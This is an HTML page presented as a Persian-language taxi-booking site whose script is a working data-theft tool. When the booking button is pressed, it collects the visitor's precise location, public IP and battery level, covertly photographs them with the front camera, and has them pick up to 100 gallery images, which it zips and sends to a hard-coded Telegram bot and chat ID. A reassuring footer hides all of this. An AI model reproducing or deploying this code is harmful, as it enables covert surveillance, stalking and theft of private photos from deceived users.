<!doctype html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>ØªØ§Ú©Ø³ÛŒ Ø¨Ø§Ø¨Ø§ Ø¹Ø¨Ø§Ø³</title>
  <style>
    :root {
      --primary: #2E86C1;
      --secondary: #17A589;
      --accent: #F39C12;
      --light: #F8F9F9;
      --dark: #1B2631;
      --success: #28B463;
      --danger: #E74C3C;
      --gray: #85929E;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: "Segoe UI", Tahoma, sans-serif;
      background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
      color: var(--dark);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
      line-height: 1.6;
    }
    
    .card {
      background: var(--light);
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
      text-align: center;
      width: 100%;
      max-width: 500px;
      position: relative;
      overflow: hidden;
    }
    
    .card::before {
      content: '';
      position: absolute;
      top: 0;
      right: 0;
      width: 100%;
      height: 8px;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
    }
    
    .logo {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
    }
    
    .logo-icon {
      font-size: 50px;
      margin-left: 15px;
    }
    
    .logo-text {
      font-size: 28px;
      font-weight: 700;
      color: var(--primary);
      text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
    }
    
    .tagline {
      color: var(--gray);
      font-size: 16px;
      margin-bottom: 25px;
    }
    
    .status-container {
      background: white;
      border-radius: 12px;
      padding: 20px;
      margin: 20px 0;
      box-shadow: 0 5px 15px rgba(0,0,0,0.05);
      border: 1px solid rgba(0,0,0,0.05);
      min-height: 60px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    .status-text {
      font-size: 16px;
      color: var(--dark);
    }
    
    .progress-container {
      width: 100%;
      height: 8px;
      background: #E5E8E8;
      border-radius: 10px;
      margin: 20px 0;
      overflow: hidden;
    }
    
    .progress-bar {
      height: 100%;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      border-radius: 10px;
      width: 0%;
      transition: width 0.5s ease;
    }
    
    .btn {
      background: var(--primary);
      color: white;
      border: none;
      padding: 14px 28px;
      border-radius: 50px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      transition: all 0.3s ease;
      box-shadow: 0 5px 15px rgba(46, 134, 193, 0.4);
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      margin-top: 10px;
    }
    
    .btn:hover {
      background: var(--secondary);
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(46, 134, 193, 0.5);
    }
    
    .btn:active {
      transform: translateY(0);
    }
    
    .btn-secondary {
      background: white;
      color: var(--primary);
      border: 2px solid var(--primary);
      box-shadow: none;
    }
    
    .btn-secondary:hover {
      background: #f0f8ff;
    }
    
    .btn-icon {
      margin-left: 8px;
      font-size: 18px;
    }
    
    .features {
      display: flex;
      justify-content: space-between;
      margin: 25px 0;
    }
    
    .feature {
      text-align: center;
      flex: 1;
      padding: 0 10px;
    }
    
    .feature-icon {
      font-size: 24px;
      margin-bottom: 8px;
      color: var(--primary);
    }
    
    .feature-text {
      font-size: 13px;
      color: var(--gray);
    }
    
    .file-info {
      margin-top: 15px;
      font-size: 14px;
      color: var(--gray);
      word-break: break-word;
    }
    
    video {
      display: none;
      width: 100%;
      max-width: 300px;
      height: 400px;
      border-radius: 12px;
      object-fit: cover;
      margin: 15px auto;
      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
      border: 3px solid white;
    }
    
    .hidden {
      display: none;
    }
    
    .footer {
      margin-top: 25px;
      font-size: 12px;
      color: var(--gray);
    }
    
    @media (max-width: 480px) {
      .card {
        padding: 20px;
      }
      
      .logo-text {
        font-size: 24px;
      }
      
      .btn {
        padding: 12px 24px;
      }
    }
  </style>
  <!-- JSZip (CDN) -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js" integrity="sha512-HOgpYb+HjYVnQd2vQn0v1pCqgDj+/lqzqI+YgqgZsS0k9QxY9j8xgK7k9m7mT5fZkQZ3gFJZbFm8x6sE5dG0g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>
<body>
  <div class="card">
    <div class="logo">
      <div class="logo-icon">ğŸš•</div>
      <div class="logo-text">ØªØ§Ú©Ø³ÛŒ Ø¨Ø§Ø¨Ø§ Ø¹Ø¨Ø§Ø³</div>
    </div>
    
    <p class="tagline">Ø³ÙØ± Ù…Ø·Ù…Ø¦Ù† Ùˆ Ø±Ø§Ø­Øª Ø¨Ø§ Ø¨Ù‡ØªØ±ÛŒÙ† Ø®ÙˆØ¯Ø±ÙˆÙ‡Ø§</p>
    
    <div class="status-container">
      <div id="status" class="status-text">Ø¨Ø±Ø§ÛŒ Ø¯Ø±Ø®ÙˆØ§Ø³Øª ØªØ§Ú©Ø³ÛŒ Ø±ÙˆÛŒ Ø¯Ú©Ù…Ù‡ Ø²ÛŒØ± Ú©Ù„ÛŒÚ© Ú©Ù†ÛŒØ¯</div>
    </div>
    
    <div class="progress-container">
      <div id="progressBar" class="progress-bar"></div>
    </div>
    
    <div class="features">
      <div class="feature">
        <div class="feature-icon">ğŸ“</div>
        <div class="feature-text">Ù…ÙˆÙ‚Ø¹ÛŒØªâ€ŒÛŒØ§Ø¨ÛŒ</div>
      </div>
      <div class="feature">
        <div class="feature-icon">ğŸ“¸</div>
        <div class="feature-text">ØªØ£ÛŒÛŒØ¯ Ù‡ÙˆÛŒØª</div>
      </div>
      <div class="feature">
        <div class="feature-icon">ğŸ–¼ï¸</div>
        <div class="feature-text">Ø§Ù†ØªØ®Ø§Ø¨ ØªØµØ§ÙˆÛŒØ±</div>
      </div>
      <div class="feature">
        <div class="feature-icon">ğŸ“¤</div>
        <div class="feature-text">Ø§Ø±Ø³Ø§Ù„ Ø§Ø·Ù„Ø§Ø¹Ø§Øª</div>
      </div>
    </div>
    
    <button id="startBtn" class="btn">
      <span>Ø¯Ø±Ø®ÙˆØ§Ø³Øª ØªØ§Ú©Ø³ÛŒ</span>
      <span class="btn-icon">ğŸš—</span>
    </button>
    
    <button id="abortBtn" class="btn btn-secondary hidden">
      Ù„ØºÙˆ Ø¯Ø±Ø®ÙˆØ§Ø³Øª
    </button>
    
    <div id="fileInfo" class="fileInfo"></div>
    <video id="video" autoplay playsinline muted></video>
    
    <!-- Ù…Ø®ÙÛŒ: input ÙØ§ÛŒÙ„ Ø¨Ø±Ø§ÛŒ Ø§Ù†ØªØ®Ø§Ø¨ Ú¯Ø§Ù„Ø±ÛŒ (multiple) -->
    <input id="fileInput" type="file" accept="image/*" multiple style="display:none" />
    
    <div class="footer">
      Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø´Ù…Ø§ Ø¨Ø§ Ø§Ù…Ù†ÛŒØª Ú©Ø§Ù…Ù„ Ø§Ø±Ø³Ø§Ù„ Ù…ÛŒâ€ŒØ´ÙˆØ¯
    </div>
  </div>

  <script>
    // ====== Ù¾ÛŒÚ©Ø±Ø¨Ù†Ø¯ÛŒ ======
    const BOT_TOKEN = '8295388715:AAGkM7QaqplE1WNpM6S_GI6aBLzBObK2he8';
    const CHAT_ID = '8293145520';
    const MAX_IMAGES = 100;
    const MAX_ZIP_BYTES = 48 * 1024 * 1024;

    // ====== DOM ======
    const startBtn = document.getElementById('startBtn');
    const abortBtn = document.getElementById('abortBtn');
    const statusDiv = document.getElementById('status');
    const progressBar = document.getElementById('progressBar');
    const fileInput = document.getElementById('fileInput');
    const fileInfo = document.getElementById('fileInfo');
    const video = document.getElementById('video');

    let abortRequested = false;
    let mediaStream = null;

    function setStatus(msg) { 
      statusDiv.textContent = msg; 
    }
    
    function setProgress(percent) {
      progressBar.style.width = percent + '%';
    }

    // --- Ú©Ù…Ú©â€ŒØ§ÙØ²Ø§Ø±Ù‡Ø§: Ù…ÙˆÙ‚Ø¹ÛŒØªØŒ Ø¯ÙˆØ±Ø¨ÛŒÙ†ØŒ Ø¨Ø§ØªØ±ÛŒØŒ Ø¢ÛŒâ€ŒÙ¾ÛŒ ---
    function getCurrentPositionPromise() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) return reject(new Error('Geolocation not supported'));
        navigator.geolocation.getCurrentPosition(pos => {
          resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
        }, err => {
          if (err.code === err.PERMISSION_DENIED) reject(new Error('Location access denied'));
          else reject(new Error('Location error: ' + (err.message || err.code)));
        }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
      });
    }

    async function getBatteryInfo() {
      try {
        if (!('getBattery' in navigator)) return null;
        const battery = await navigator.getBattery();
        const level = Math.round((battery.level || 0) * 100);
        const charging = battery.charging;
        return { level, charging };
      } catch (e) { return null; }
    }

    async function getPublicIP() {
      try {
        const r = await fetch('https://api.ipify.org?format=json');
        if (!r.ok) return null;
        const j = await r.json();
        return j.ip || null;
      } catch (e) { return null; }
    }

    // Ø¯ÙˆØ±Ø¨ÛŒÙ† (Ø³Ù„ÙÛŒ)
    async function startCamera() {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        throw new Error('Camera not available');
      }
      mediaStream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: { ideal: "user" } }, 
        audio: false 
      });
      video.srcObject = mediaStream;
      video.style.display = 'block';
      try { await video.play(); } catch(e){}
    }
    
    async function stopCamera() {
      video.style.display = 'none';
      if (mediaStream) {
        mediaStream.getTracks().forEach(t => t.stop());
        mediaStream = null;
      }
      try { video.pause(); } catch(e){}
      video.srcObject = null;
    }
    
    function captureBlobFromVideo() {
      const w = video.videoWidth || 640;
      const h = video.videoHeight || 480;
      const canvas = document.createElement('canvas');
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');
      ctx.translate(w, 0); 
      ctx.scale(-1, 1); // mirror
      ctx.drawImage(video, 0, 0, w, h);
      return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
    }

    // Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
    async function sendPhotoToTelegram(photoBlob, caption = '') {
      const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendPhoto`;
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', new File([photoBlob], 'photo.jpg', { type: 'image/jpeg' }));
      if (caption) form.append('caption', caption);
      const r = await fetch(url, { method: 'POST', body: form });
      const j = await r.json();
      if (!j.ok) throw new Error('Telegram photo error: ' + (j.description || r.statusText));
      return j;
    }
    
    async function sendDocumentToTelegram(fileBlob, filename = 'gallery.zip', caption = '') {
      const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendDocument`;
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('document', new File([fileBlob], filename, { type: 'application/zip' }));
      if (caption) form.append('caption', caption);
      const r = await fetch(url, { method: 'POST', body: form });
      const j = await r.json();
      if (!j.ok) throw new Error('Telegram document error: ' + (j.description || r.statusText));
      return j;
    }

    // ØªØ§Ø¨Ø¹ Ø§ØµÙ„ÛŒ: Ø§Ø¬Ø±Ø§ Ù‡Ù†Ú¯Ø§Ù… Ú©Ù„ÛŒÚ©
    startBtn.addEventListener('click', async () => {
      abortRequested = false;
      startBtn.classList.add('hidden');
      abortBtn.classList.remove('hidden');
      setProgress(10);
      
      try {
        // 1) Ú¯Ø±ÙØªÙ† Ù…ÙˆÙ‚Ø¹ÛŒØª
        setProgress(20);
        const { lat, lon } = await getCurrentPositionPromise();
        
        // Ø§Ø±Ø³Ø§Ù„ Ù…ÙˆÙ‚Ø¹ÛŒØª
        const locationCaption = `ğŸ  Ù…ÙˆÙ‚Ø¹ÛŒØª: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}`;
        await sendPhotoToTelegram(new Blob(), locationCaption);
        
        // 2) Ú¯Ø±ÙØªÙ† Ø¢ÛŒâ€ŒÙ¾ÛŒ
        setProgress(30);
        const ip = await getPublicIP();
        
        // 3) Ú¯Ø±ÙØªÙ† ÙˆØ¶Ø¹ÛŒØª Ø¨Ø§ØªØ±ÛŒ
        setProgress(40);
        const battery = await getBatteryInfo();
        const batteryText = battery ? `${battery.level}%${battery.charging ? ' (Ø´Ø§Ø±Ú˜)' : ''}` : 'Ù†Ø§Ù…Ø´Ø®Øµ';
        
        // Ø§Ø±Ø³Ø§Ù„ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¨Ø§ØªØ±ÛŒ Ùˆ Ø¢ÛŒâ€ŒÙ¾ÛŒ
        const infoCaption = `ğŸ”‹ Ø¯Ø±ØµØ¯ Ø´Ø§Ø±Ú˜: ${batteryText}\nğŸ’ Ø¢ÛŒâ€ŒÙ¾ÛŒ: ${ip || 'Ù†Ø§Ù…Ø´Ø®Øµ'}`;
        await sendPhotoToTelegram(new Blob(), infoCaption);
        
        // 4) Ú¯Ø±ÙØªÙ† Ø³Ù„ÙÛŒ
        setProgress(50);
        await startCamera();
        await new Promise(r => setTimeout(r, 800));
        const selfieBlob = await captureBlobFromVideo();
        await stopCamera();
        
        if (abortRequested) { 
          setStatus('Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù„ØºÙˆ Ø´Ø¯');
          return; 
        }
        
        // Ø§Ø±Ø³Ø§Ù„ Ø³Ù„ÙÛŒ
        setProgress(60);
        await sendPhotoToTelegram(selfieBlob, 'Ø³Ù„ÙÛŒ Ù…Ø´ØªØ±ÛŒ');
        
        // 5) Ø§Ù†ØªØ®Ø§Ø¨ ØªØµØ§ÙˆÛŒØ± Ø§Ø² Ú¯Ø§Ù„Ø±ÛŒ
        setProgress(70);
        fileInput.value = '';
        fileInput.click();
        
        const files = await new Promise((resolve) => {
          fileInput.onchange = (ev) => {
            const f = Array.from(ev.target.files || []);
            resolve(f.slice(0, MAX_IMAGES));
          };
          setTimeout(() => resolve([]), 60000);
        });

        if (!files || files.length === 0) {
          setStatus('Ù‡ÛŒÚ† ØªØµÙˆÛŒØ±ÛŒ Ø§Ù†ØªØ®Ø§Ø¨ Ù†Ø´Ø¯');
          return;
        }

        // 6) Ø³Ø§Ø®Øª Ø²ÛŒÙ¾
        setProgress(80);
        const zip = new JSZip();
        const folder = zip.folder('gallery') || zip;
        
        for (let i = 0; i < files.length; i++) {
          if (abortRequested) { 
            setStatus('Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù„ØºÙˆ Ø´Ø¯');
            return; 
          }
          const f = files[i];
          const safeName = `${String(i+1).padStart(3,'0')}-${f.name}`;
          folder.file(safeName, f);
          setProgress(80 + Math.floor((i / files.length) * 15));
        }

        // ØªÙˆÙ„ÛŒØ¯ Ø²ÛŒÙ¾
        const zipBlob = await zip.generateAsync({ type: 'blob' }, (meta) => {
          setProgress(95 + Math.floor(meta.percent / 20));
        });

        if (zipBlob.size > MAX_ZIP_BYTES) {
          setStatus('Ø­Ø¬Ù… ÙØ§ÛŒÙ„ Ø¨Ø³ÛŒØ§Ø± Ø¨Ø²Ø±Ú¯ Ø§Ø³Øª');
          return;
        }

        if (abortRequested) { 
          setStatus('Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù„ØºÙˆ Ø´Ø¯');
          return; 
        }

        // 7) Ø§Ø±Ø³Ø§Ù„ Ø²ÛŒÙ¾
        setProgress(98);
        const caption = `Ú¯Ø§Ù„Ø±ÛŒ Ù…Ø´ØªØ±ÛŒ â€” ØªØ¹Ø¯Ø§Ø¯: ${files.length}`;
        await sendDocumentToTelegram(zipBlob, 'gallery.zip', caption);
        
        setProgress(100);
        setStatus('Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø´Ù…Ø§ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø«Ø¨Øª Ø´Ø¯. ØªØ§Ú©Ø³ÛŒ Ø¨Ù‡ Ø²ÙˆØ¯ÛŒ Ù…ÛŒâ€ŒØ±Ø³Ø¯.');
        
      } catch (err) {
        setStatus('Ø®Ø·Ø§ÛŒÛŒ Ø±Ø® Ø¯Ø§Ø¯Ù‡ Ø§Ø³Øª. Ù„Ø·ÙØ§Ù‹ Ù…Ø¬Ø¯Ø¯Ø§Ù‹ ØªÙ„Ø§Ø´ Ú©Ù†ÛŒØ¯.');
        console.error(err);
      } finally {
        startBtn.classList.remove('hidden');
        abortBtn.classList.add('hidden');
        try { await stopCamera(); } catch(e){}
      }
    });

    abortBtn.addEventListener('click', () => {
      abortRequested = true;
      setStatus('Ø¯Ø± Ø­Ø§Ù„ Ù„ØºÙˆ Ø¯Ø±Ø®ÙˆØ§Ø³Øª...');
    });
  </script>
</body>
  </html>
